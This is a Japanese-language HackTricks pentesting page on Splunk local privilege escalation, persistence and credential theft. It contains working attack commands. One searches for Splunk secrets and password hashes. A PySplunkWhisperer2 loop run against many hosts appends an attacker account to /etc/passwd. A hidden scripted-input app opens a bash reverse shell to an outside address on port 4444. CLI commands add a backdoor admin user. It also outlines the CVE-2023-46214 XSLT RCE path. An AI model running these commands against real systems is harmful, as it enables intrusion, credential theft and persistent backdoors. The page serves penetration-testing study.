# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

マシンを**内部**または**外部**から**enumerating**していて、**Splunk が稼働中**（通常、Web UI は **8000**、management API は **8089**）であることが分かった場合、有効な認証情報から、app のインストール、scripted inputs、management actions を通じて**コード実行**につなげられることがよくあります。Splunk が **root** として稼働している場合、これは頻繁に即時の**権限昇格**につながります。

generic なリモート攻撃対象領域、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

すでに **root** で、Splunk service が localhost のみで listen していない場合は、**Splunk password hashes** の窃取、**encrypted secrets** の復元、または**悪意のある app** の push によって、ローカルまたは複数の forwarder にわたる persistence を維持することもできます。

## 興味深いローカルファイル

Splunk または Splunk Universal Forwarder が稼働している host に侵入した場合、通常、以下の path が最も興味深いものです。
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要なアーティファクト:

- **`$SPLUNK_HOME/etc/passwd`**: ローカルのSplunkユーザーとパスワードハッシュ。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の`.conf`ファイルに保存されたsecretをSplunkが暗号化するために使用するキー。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期adminのbootstrapファイル。gold imageやprovisioningのミスで有用。`etc/passwd`がすでに存在する場合は無視される。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputsが有効化されることが多い場所。
- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent appを隠したり、すでに配布されているものを確認したりするのに適した場所。

## Splunk Universal Forwarder Agent Exploitの概要

詳細については、[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を参照してください。これは単なる概要です:<sup>[[1]](#references)</sup>

**Exploitの概要:**
Splunk Universal Forwarder（UF）を標的とするexploitにより、**agent password**を持つ攻撃者は、agentが動作しているシステム上で任意のコードを実行できます。これにより、環境の大部分が侵害される可能性があります。

**動作する理由:**

- UFのmanagement serviceは、通常**TCP 8089**で公開されています。
- 攻撃者はAPIにauthenticateし、forwarderに**malicious app bundle**をinstallするよう指示できます。
- 同じprimitiveを、ローカルでは**LPE**、リモートでは**RCE**に使用できます。
- **SplunkWhisperer2**などのpublic toolingはapp bundleを自動的に作成し、Linux target向けにpayloadを適応させることができます。

**passwordをrecoverする一般的な方法:**

- documentation、script、share、deployment automationに残されたcleartext credentials。
- `$SPLUNK_HOME/etc/passwd`内のpassword hashを取得し、offline crackingを行う。
- `user-seed.conf`などのgolden imageやprovisioningの残骸。

**影響:**

- 侵害された各host上でのSYSTEM/root-level code execution。
- persistent app、backdoor、またはransomwareのdeploy。
- dataがforwardされる前にtelemetryをdisableまたはtamper。

**Exploitの実行例:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**利用可能な公開 exploit:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs または Malicious Apps による Persistence

`root`/`splunk` として **filesystem write access** がある場合、または認証済みアクセスによって apps を install できる場合、非常に信頼性の高い Persistence の手法は、**scripted input** を含む **custom app** を配置することです。<sup>[[2]](#references)</sup> Splunk 自身のドキュメントでは、scripted inputs は app directory 配下に配置し、`inputs.conf` から有効化することが想定されています。

一般的な構成:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最小限の `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
簡易 Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
メモ:

- 同じ trick は、`/opt/splunkforwarder/etc/apps/` を使用する **Universal Forwarder** でも機能します。
- Attackers は、明らかに malicious な app を作成する代わりに、正規の add-on を変更して紛れ込むことがよくあります。
- **deployment server** では、`deployment-apps/` 内に malicious app を仕込むと **fleet-wide persistence** につながります。これは、forwarders が更新された app を poll して download し、適用時に再起動することが多いためです。

## Credential Theft and Admin Takeover

Splunk の local files を読み取れる場合、通常は **Splunk admin access** の回復と **encrypted service credentials** の回復という、2 つの有力な目標があります。

### Password hashes and local users

Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、この file を crack することで、web UI と management API で使用できる credentials を回復できます。

すでに有効な **admin** credentials を持っており、Splunk が **native** authentication backend を使用している場合、CLI 自体を persistence に使用できます。
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` と暗号化された値

Splunk は、複数の設定ファイルに保存される機密値を保護するために `etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル**の両方を盗み出せれば、以下の値を復元または再利用できる場合があります。

- `pass4SymmKey` などの forwarder/indexer 間の shared secret
- `sslPassword` などの TLS private-key password
- `bindDNPassword` などの LDAP bind credential

これは、Splunk admin password 自体を crack できない場合でも、**lateral movement** に有用です。

### `user-seed.conf` の悪用

`user-seed.conf` は、初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため、稼働中の box ではあまり有用ではありませんが、以下の環境では非常に興味深い対象になります。

- 侵害された installation template
- container image
- unattended provisioning workflow
- Splunk が自動的に再初期化される appliance

このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、redeployment 後に admin access を静かに取り戻せます。

## Splunk Queries の悪用

詳細については [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>

最近有用な technique の 1 つは、脆弱な Splunk Enterprise version において **user-supplied XSLT** を悪用し、low-privileged な authenticated account を **OS command execution** が可能な `splunk` user へ昇格させることです。

High-level flow:

1. Splunk に authenticate する。
2. preview/upload functionality を通じて malicious **XSL** file を upload する。
3. upload した stylesheet を **dispatch** directory から使用して、Splunk に search result を render させる。
4. XSLT payload を使用して file を書き込むか、Splunk の search pipeline を通じて execution を trigger する（たとえば `runshellscript` などの internal functionality に到達する）。

重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** であることです。Linux では通常、**`splunk`** account での access になります。この user は application tree の所有者であることが多く、secret を読み取り、shell を失った後も存続する persistent app を仕込めるため、それでも価値があります。

exploitation 中に使用される representative path は次のとおりです：
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk が過剰な権限で実行されている場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service unit、あるいは不適切な `sudo` ルールにアクセスできる場合、これは容易な **LPE** chain になります。

## 参考資料

- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
